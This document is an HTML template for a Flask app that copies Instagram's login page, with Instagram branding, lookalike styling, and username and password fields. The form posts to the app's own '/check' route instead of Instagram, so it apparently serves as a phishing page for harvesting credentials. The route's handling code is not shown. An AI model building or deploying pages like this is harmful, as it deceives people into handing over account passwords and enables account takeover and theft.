<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram â€¢ Log in</title>
    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo">
                <h1>Instagram</h1>
            </div>
            <form id="login-form" action="/check" method="POST">
                <div class="input-field">
                    <input type="text" name="username" placeholder="Phone number, username, or email" required>
                </div>
                <div class="input-field">
                    <input type="password" name="password" placeholder="Password" required>
                </div>
                <button type="submit" class="login-btn">Log in</button>
            </form>
            <div class="divider">
                <div class="line"></div>
                <span>OR</span>
                <div class="line"></div>
            </div>
            <div class="fb-login">
                <a href="#">Log in with Facebook</a>
            </div>
            <a href="#" class="forgot-password">Forgot password?</a>
        </div>
        <div class="signup-box">
            <p>Don't have an account? <a href="#">Sign up</a></p>
        </div>
    </div>
</body>
</html>
<style>
    body {
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    background-color: #fafafa;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
}

.container {
    text-align: center;
}

.login-box {
    background: white;
    border: 1px solid #dbdbdb;
    border-radius: 1px;
    padding: 10px 0;
    width: 350px;
    margin-bottom: 10px;
}

.logo h1 {
    font-style: italic;
    font-size: 40px;
    font-weight: 100;
    margin: 20px 0;
}

.input-field {
    margin: 5px 20px;
}

.input-field input {
    width: 100%;
    padding: 9px 0 7px 8px;
    border: 1px solid #dbdbdb;
    border-radius: 3px;
    background-color: #fafafa;
    box-sizing: border-box;
}

.login-btn {
    width: 90%;
    padding: 8px;
    background-color: #0095f6;
    color: white;
    border: none;
    border-radius: 8px;
    font-weight: bold;
    margin: 10px 0;
    cursor: pointer;
}

.divider {
    display: flex;
    align-items: center;
    margin: 15px 40px;
}

.line {
    flex-grow: 1;
    height: 1px;
    background-color: #dbdbdb;
}

.divider span {
    color: #8e8e8e;
    font-size: 13px;
    padding: 0 18px;
}

.fb-login a {
    color: #385185;
    font-weight: 600;
    font-size: 14px;
    text-decoration: none;
}

.forgot-password {
    display: block;
    color: #385185;
    font-size: 12px;
    margin-top: 10px;
    text-decoration: none;
}

.signup-box {
    background: white;
    border: 1px solid #dbdbdb;
    border-radius: 1px;
    padding: 10px;
    width: 350px;
}

.signup-box p {
    font-size: 14px;
    margin: 0;
}

.signup-box a {
    color: #0095f6;
    font-weight: 600;
    text-decoration: none;
}
</style>
